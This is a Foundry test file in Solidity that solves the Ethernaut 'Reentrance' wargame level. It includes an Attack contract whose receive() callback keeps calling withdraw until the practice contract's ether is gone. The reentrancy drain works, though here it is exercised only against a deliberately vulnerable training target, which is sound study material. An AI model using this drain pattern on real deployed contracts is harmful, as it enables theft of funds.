// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/10-Reentrance/ReentranceFactory.sol";
import "../src/Ethernaut.sol";

contract ReentranceTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testReentranceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ReentranceFactory factory = new ReentranceFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        // Reentrance level = Reentrance(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Create ReentranceHack contract
        Attack hack = new Attack(levelAddress);

        // Call the attack function to drain the contract
        hack.attack{value: 0.1 ether}();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {

    Reentrance target;

    constructor(address _target) {
        target = Reentrance(payable(_target));
    }

    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw(0.1 ether);
    }

    receive() external payable {
        if (address(target).balance >= 0.1 ether) {
            target.withdraw(0.1 ether);
        }
    }
}